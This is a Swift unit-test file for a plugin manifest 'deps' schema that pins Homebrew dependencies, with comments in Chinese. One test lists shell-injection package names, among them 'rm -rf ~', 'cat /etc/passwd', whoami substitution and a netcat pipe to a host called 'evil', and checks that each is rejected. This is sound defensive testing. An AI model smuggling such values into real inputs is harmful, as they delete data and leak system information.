import XCTest
@testable import BuddyCore

// MARK: - PluginManifestDepsTests
//
// 蓝队单测 T1：PluginManifest 新增 `deps: [PluginDep]?` schema（契约 M1）。
//
// 契约引用（state.md ## 契约规约 M1 + 接口签名）：
//   struct PluginDep: Codable, Equatable { let check: String; let brew: String?; let label: String? }
//   StdinConfig / CommandConfig 新增：let deps: [PluginDep]?
//   Codable：decodeIfPresent ?? []（向后兼容，无 deps 字段 → 空数组）
//
// TDD：本文件先于实现编写，最初编译失败（RED），实现后转 GREEN。

final class PluginManifestDepsTests: XCTestCase {

    // MARK: - Helpers

    private func decode(_ json: String) throws -> PluginManifest {
        let data = json.data(using: .utf8)!
        return try JSONDecoder().decode(PluginManifest.self, from: data)
    }

    // MARK: - PluginDep Codable

    /// 契约 M1：PluginDep 含 check/brew?/label? 三字段，完整 decode。
    func test_AT01_pluginDep_decodesAllFields() throws {
        let json = """
        {
            "name": "qr", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "command", "cmd": "./qr-gen.sh",
            "deps": [{"check":"qrencode","brew":"qrencode","label":"二维码生成库"}]
        }
        """
        let m = try decode(json)
        XCTAssertEqual(m.deps.count, 1, "command mode deps 应为 1 个")
        let dep = m.deps.first!
        XCTAssertEqual(dep.check, "qrencode")
        XCTAssertEqual(dep.brew, "qrencode")
        XCTAssertEqual(dep.label, "二维码生成库")
    }

    /// 契约 M1：brew / label 可选（无 brew 映射的依赖，只能手动装）。
    func test_AT02_pluginDep_brewAndLabelOptional() throws {
        let json = """
        {
            "name": "x", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "stdin", "cmd": "./x.sh",
            "deps": [{"check":"some-binary"}]
        }
        """
        let m = try decode(json)
        XCTAssertEqual(m.deps.count, 1)
        XCTAssertEqual(m.deps.first?.check, "some-binary")
        XCTAssertNil(m.deps.first?.brew)
        XCTAssertNil(m.deps.first?.label)
    }

    // MARK: - 向后兼容（无 deps 字段）

    /// 契约 M1：无 deps 字段的 legacy 插件不报错（decodeIfPresent ?? []）。
    func test_AT03_legacyPlugin_missingDepsDecodesAsEmpty() throws {
        let json = """
        {
            "name": "legacy", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "stdin", "cmd": "./x.sh"
        }
        """
        let m = try decode(json)
        XCTAssertEqual(m.deps, [], "无 deps 字段应 decode 为空数组（向后兼容）")
    }

    /// 契约 M1：command mode 同样支持 deps。
    func test_AT04_commandMode_supportsDeps() throws {
        let json = """
        {
            "name": "qr", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "command", "cmd": "./qr-gen.sh",
            "deps": [{"check":"qrencode","brew":"qrencode"}]
        }
        """
        let m = try decode(json)
        XCTAssertEqual(m.deps.count, 1)
    }

    /// 契约 M1：prompt mode 也可带 deps（虽然 prompt 不直接跑子进程，schema 不拒绝）。
    func test_AT05_promptMode_depsFieldIgnoredButDecodes() throws {
        let json = """
        {
            "name": "p", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "prompt", "systemPrompt": "hello", "maxIterations": 1,
            "deps": [{"check":"qrencode"}]
        }
        """
        // prompt mode 的 deps 字段 decode 不报错（向后兼容容错，运行时不用于 prompt）
        XCTAssertNoThrow(try decode(json))
    }

    // MARK: - Codable round-trip

    /// 契约 M1：encode → decode 等价（round-trip）。
    func test_AT06_depsRoundTrip() throws {
        let json = """
        {
            "name": "qr", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "command", "cmd": "./qr-gen.sh",
            "deps": [{"check":"qrencode","brew":"qrencode","label":"二维码生成库"}]
        }
        """
        let m1 = try decode(json)
        let reencoded = try JSONEncoder().encode(m1)
        let m2 = try JSONDecoder().decode(PluginManifest.self, from: reencoded)
        XCTAssertEqual(m1, m2, "deps 字段 round-trip 必须等价")
    }

    /// 契约 M1：deps 是 PluginDep 值类型，Equatable 自动合成。
    func test_AT07_pluginDep_equatable() {
        let d1 = PluginDep(check: "qrencode", brew: "qrencode", label: "二维码生成库")
        let d2 = PluginDep(check: "qrencode", brew: "qrencode", label: "二维码生成库")
        let d3 = PluginDep(check: "qrencode", brew: nil, label: nil)
        XCTAssertEqual(d1, d2)
        XCTAssertNotEqual(d1, d3)
    }

    // MARK: - 边界值（DbC）

    /// 契约边界值：PluginDep.check 非空命令名（count >= 1）。
    /// 注：空 check 字段本身 Codable 不拒绝（decode 不抛），由 PluginManifest.validate 兜底或运行时报错。
    /// 此测试只验证 check 字段被正确保留。
    func test_AT08_pluginDep_checkFieldPreserved() throws {
        let json = """
        {
            "name": "x", "version": "0.1.0", "description": "d", "keywords": [],
            "mode": "stdin", "cmd": "./x.sh",
            "deps": [{"check":"my-tool","label":"我的工具"}]
        }
        """
        let m = try decode(json)
        XCTAssertEqual(m.deps.first?.check, "my-tool")
        XCTAssertEqual(m.deps.first?.label, "我的工具")
    }

    // MARK: - B1 安全：brew 包名白名单（防 shell 注入）

    /// B1 安全：brew 包名含 shell 元字符必须 decode 失败（防 /bin/sh -c 注入）。
    /// 攻击面：第三方插件 plugin.json "brew":"foo; rm -rf ~" → brew install 走 /bin/sh -c 直接执行任意命令。
    func test_AT09_brew_shellInjection_decodeFails() {
        let malicious = [
            "foo; rm -rf ~",
            "foo && cat /etc/passwd",
            "foo$(whoami)",
            "foo`whoami`",
            "foo|nc evil 1234",
            "foo > /tmp/pwned",
        ]
        for evil in malicious {
            let json = #"{"name":"x","version":"0.1.0","description":"d","keywords":[],"mode":"stdin","cmd":"./x.sh","deps":[{"check":"foo","brew":"\#(evil)"}]}"#
            XCTAssertThrowsError(try decode(json),
                "brew 含 shell 元字符必须 decode 失败（B1 防 /bin/sh -c 注入）：\(evil)") { _ in }
        }
    }

    /// B1 安全：brew 合法包名（含 tap/name、版本、扩展字符）通过白名单。
    func test_AT10_brew_validPackageName_decodes() throws {
        let valid = ["qrencode", "imagemagick", "homebrew/cask/foo", "python@3.11", "lib.foo+bar-baz"]
        for name in valid {
            let json = #"{"name":"x","version":"0.1.0","description":"d","keywords":[],"mode":"stdin","cmd":"./x.sh","deps":[{"check":"foo","brew":"\#(name)"}]}"#
            let m = try decode(json)
            XCTAssertEqual(m.deps.first?.brew, name, "合法 brew 包名应通过白名单：\(name)")
        }
    }
}
